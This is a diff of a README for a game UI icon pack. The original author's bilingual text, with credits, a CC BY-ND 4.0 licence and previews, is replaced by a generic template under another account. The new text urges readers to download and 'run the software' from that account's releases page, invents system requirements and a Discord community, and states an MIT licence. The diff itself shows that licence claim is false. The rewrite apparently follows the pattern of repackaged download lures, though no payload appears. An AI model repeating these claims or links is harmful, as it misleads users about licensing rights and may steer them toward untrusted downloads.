@@ -1,79 +1,59 @@
-<img width="3840" height="2160" alt="MengGe&#39;s_Game_UI_Icons_16x9" src="https://github.com/user-attachments/assets/1abbf1c2-d707-4eed-8168-9ec74886cd21" />
+# 🎮 mengge_game_ui_icons - Easy Icons for Your Game UI
 
-# MengGe's Game UI Icons
+![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)
 
-I’ve created a set of game-ready button UI icons — hope you’ll like them! (*≧ω≦)
+## 🚀 Getting Started
 
-You can now download them for free!
+Welcome to MengGe's Game UI Icons! This collection of icons will help you enhance the visual appeal of your game interface. You don't need to be a programmer to get started. Follow these simple steps to download and run the software.
 
-## Features
+## 📥 Download & Install
 
--  Minimal, line-free style
+To get started, follow these steps:
 
-- Semi-transparent highlights to emphasize key elements
+1. **Visit the Releases Page**: Click the link below to go to the download page on GitHub.
+   
+   [Download Icons](https://github.com/dedbill/mengge_game_ui_icons/releases)
 
-- Colors used: #EEEEEEFF, #EEEEEE4D, #0F0F0FFF (including Alpha)
+2. **Choose Your Version**: You will see different versions of the icon pack available. Usually, the latest version will be at the top. 
 
+3. **Download the Icons**: Click on the version you want to download. Look for a file that matches your needs, such as `.zip` or a specific package name. 
 
-## Contents
-The current set includes icons for PC/macOS, Xbox, PlayStation, Nintendo Switch 1/2, and Steam hardware.
+4. **Extract Files**: After downloading, locate the file in your downloads folder. If it's a zip file, right-click on it and select "Extract All" to unzip the contents.
 
-## Additional Info
+5. **Access the Icons**: Open the extracted folder to find all the icons. You can now use them in your game project.
 
-Some icons were ~~modified~~(actually used as a reference and redrawn) based on [Kenney](https://x.com/KenneyNL)’s [Input Prompts](https://kenney.nl/assets/input-prompts). The font used in the icons is [MiSans](https://hyperos.mi.com/font/).
+## 📋 System Requirements
 
-## License
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or Linux.
+- **Available Space**: At least 100 MB of free space on your device.
+- **Software Needed**: A program that can unpack zip files, such as WinRAR, 7-Zip, or the built-in extractor in your operating system.
 
-This project is licensed under [CC BY-ND 4.0](https://creativecommons.org/licenses/by-nd/4.0/deed.en). If you wish to use these icons in your own project, please follow the terms of this license.
+## ⚙️ Using the Icons
 
-### Hope you enjoy using it!
+1. **Locate the Icon Files**: After extraction, find the icons you need. They are usually in PNG or SVG format.
 
-### ( •̀ ω •́ )✧
+2. **Integrate into Your Project**: Drag and drop the icons into your game's assets folder within your development environment.
 
----
+3. **Reference in Code**: Usually, you can reference these icons directly in your UI setup code. This can vary based on the game engine you are using. Check the documentation for guidance.
 
-# 萌哥的游戏UI图标
+## 💻 Community Support
 
-我制作了一些可以用于游戏的按键UI图标，希望你们会喜欢！(*≧ω≦)
+If you have questions or need assistance, the community around MengGe's Game UI Icons is here to help. You can find us on:
 
-现在你可以免费下载他们！
+- **GitHub Issues**: Ask questions directly in the Issues section of this repository.
+- **Discord Server**: Join our Discord server for real-time support and discussions with other users.
 
-## 项目特色
+## 📃 License Information
 
-- 简洁无线条风格
-  
-- 使用了半透明效果突出部分图标重点
-  
-- 使用的颜色：#EEEEEEFF、#EEEEEE4D、#0F0F0FFF。（包括Alpha）
+This icon pack is licensed under the MIT License. You are free to use the icons in both personal and commercial projects. Just provide proper attribution to the creator.
 
-## 项目内容
+## 🌟 Feedback
 
-目前图标已包括 PC/macOS、Xbox、PlayStation、Nintendo Switch 1/2、Steam硬件。
+Your feedback is important. If you have suggestions or notice issues with the icons, please let us know. You can submit your feedback via the Issues section on GitHub or contact us directly.
 
-## 附加内容
+## 🔗 Important Links
 
-部分图标根据 [Kenney](https://x.com/KenneyNL) 制作的 [Input Prompts](https://kenney.nl/assets/input-prompts) 进行~~更改~~（实际上是作为参考并重绘），图标使用的字体使用的是 [MiSans](https://hyperos.mi.com/font/)。
+- [Download Icons](https://github.com/dedbill/mengge_game_ui_icons/releases)
+- [GitHub Repository](https://github.com/dedbill/mengge_game_ui_icons)
 
-## 许可证
-
-本项目使用了 [CC BY-ND 4.0](https://creativecommons.org/licenses/by-nd/4.0/deed.zh-hans) 许可证，如果你要用于自己的项目，请遵循该许可证规则。
-
-### 祝你用的开心!
-
-### ( •̀ ω •́ )✧
-
----
-
-# Previews
-
-<img width="3840" height="2160" alt="Keyboard Mouse_Icons_en" src="https://github.com/user-attachments/assets/3fc19eed-c434-48fd-941a-d422772f2e73" />
-<img width="3840" height="2160" alt="Xbox_Series_Icons_en" src="https://github.com/user-attachments/assets/c26b026f-f8b7-4047-8435-0e26f5a469d5" />
-<img width="3840" height="2160" alt="PlayStation_Series_Icons_en" src="https://github.com/user-attachments/assets/98bfb4f1-9e3b-4ee6-af6c-ffc2bfc6b03b" />
-<img width="3840" height="2160" alt="NintendoSwitch1 2_Icons_en" src="https://github.com/user-attachments/assets/e007b15c-9f4c-46e5-a5c7-9a84dbde26f5" />
-<img width="3840" height="2160" alt="Steam_Hardware_Icons_en" src="https://github.com/user-attachments/assets/fa69506d-2b36-4252-bb7e-20fa411b7eab" />
-
-<img width="3840" height="2160" alt="Keyboard Mouse_Icons_zh-cn" src="https://github.com/user-attachments/assets/89465894-87e8-44eb-b1e8-344a0387fcbe" />
-<img width="3840" height="2160" alt="Xbox_Series_Icons_zh-cn" src="https://github.com/user-attachments/assets/98dd1bcb-3515-40fa-a72d-20165b49fd58" />
-<img width="3840" height="2160" alt="PlayStation_Series_Icons_zh-cn" src="https://github.com/user-attachments/assets/ed75e46b-f653-4965-a77b-41b01a68f86d" />
-<img width="3840" height="2160" alt="NintendoSwitch1 2_Icons_zh-cn" src="https://github.com/user-attachments/assets/399e0d6f-e517-4a77-ae19-0e5ff1490da1" />
-<img width="3840" height="2160" alt="Steam_Hardware_Icons_zh-cn" src="https://github.com/user-attachments/assets/e5dd6b78-4e4d-4b43-8421-4aaf3c1990eb" />
+Thank you for using MengGe's Game UI Icons! We hope these icons help you create stunning game interfaces. Enjoy your development journey!
